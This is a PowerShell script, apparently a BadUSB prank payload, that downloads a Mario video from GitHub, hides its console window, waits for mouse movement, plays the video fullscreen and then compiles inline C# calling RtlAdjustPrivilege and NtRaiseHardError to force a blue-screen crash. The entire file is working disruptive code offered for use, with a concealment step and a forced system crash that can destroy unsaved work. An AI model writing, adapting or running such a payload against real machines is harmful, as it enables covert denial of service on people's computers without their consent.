<#
=============================== MARIO'S BLUE SCREEN OF DEATH ============================================

SYNOPSIS
This script wil download a short mario video and play it, upon finishing the computer will bluescreen/crash.

USAGE
Run the script.


#>


$videofile = "$env:TMP/mario.wmv"
iwr "https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/Win/BSOD/mario-head/mario.wmv" -OutFile $videofile

$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

[xml]$XAML = @"
 
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"  /></Window>
"@
 
[uri]$VideoSource = New-Object System.Uri($VideoFile.FullName)

$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;

Target-Comes

$VideoPlayer.Play()

$Window.ShowDialog() | out-null

sleep 5

$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
$comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
$comparams.CompilerOptions = '/unsafe'
$a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
[CS]::Kill()